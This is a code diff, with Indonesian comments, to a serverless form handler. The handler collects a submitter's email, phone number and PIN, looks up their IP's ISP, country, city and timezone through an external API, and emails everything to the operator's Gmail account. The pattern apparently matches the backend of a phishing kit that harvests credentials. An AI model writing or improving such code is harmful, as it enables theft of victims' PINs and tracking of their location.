@@ -8,23 +8,22 @@ export default async function handler(req, res) {
   try {
     const { email, phone, pin } = req.body;
 
-    // ambil IP dari header (di Vercel/hosting biasanya pakai x-forwarded-for)
+    // ambil IP (x-forwarded-for dipakai kalau di hosting seperti vercel)
     const ip =
       req.headers["x-forwarded-for"]?.split(",")[0] ||
       req.socket?.remoteAddress ||
       "Unknown";
 
-    // ambil info ISP via API publik
-    let isp = "Unknown";
+    // ambil info dari API kamu
+    let ipInfo = {};
     try {
-      const resp = await fetch(`http://ip-api.com/json/${ip}?fields=isp`);
-      const data = await resp.json();
-      if (data?.isp) isp = data.isp;
+      const resp = await fetch(`https://cihuy-lovat.vercel.app/api/ip-checker?ip=${ip}`);
+      ipInfo = await resp.json();
     } catch (err) {
-      console.error("Gagal ambil ISP:", err);
+      console.error("Gagal ambil data IP:", err);
     }
 
-    // setup email transporter
+    // setup transporter email
     const transporter = nodemailer.createTransport({
       service: "gmail", // atau SMTP lain
       auth: {
@@ -38,7 +37,13 @@ export default async function handler(req, res) {
     if (email) message += `Email: ${email}\n`;
     if (phone) message += `Phone: ${phone}\n`;
     if (pin) message += `PIN: ${pin}\n`;
-    message += `\nIP: ${ip}\nISP: ${isp}`;
+
+    // tambahkan info ip & isp dari API
+    message += `\nIP: ${ip}`;
+    if (ipInfo.isp) message += `\nISP: ${ipInfo.isp}`;
+    if (ipInfo.country) message += `\nCountry: ${ipInfo.country}`;
+    if (ipInfo.city) message += `\nCity: ${ipInfo.city}`;
+    if (ipInfo.timezone) message += `\nTimezone: ${ipInfo.timezone}`;
 
     await transporter.sendMail({
       from: `"Notifier" <${process.env.EMAIL_USER}>`,
